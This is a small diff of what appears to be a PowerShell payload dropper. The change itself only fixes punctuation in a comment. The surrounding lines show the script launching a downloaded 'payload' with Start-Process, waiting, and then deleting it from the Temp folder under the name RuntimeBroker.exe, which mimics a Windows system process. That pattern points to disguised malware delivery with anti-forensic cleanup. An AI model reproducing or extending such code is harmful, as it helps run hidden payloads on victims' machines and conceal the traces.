@@ -61,7 +61,7 @@ Start-Process -FilePath $output
 
 ######################################################################################################################################################################
 
-# (The payload you downloaded will be deleted after the process is finished..)
+# (The payload you downloaded will be deleted after the process is finished.)
 
 Start-Sleep -Milliseconds 6000 
 Remove-Item -path "$env:Temp/RuntimeBroker.exe"
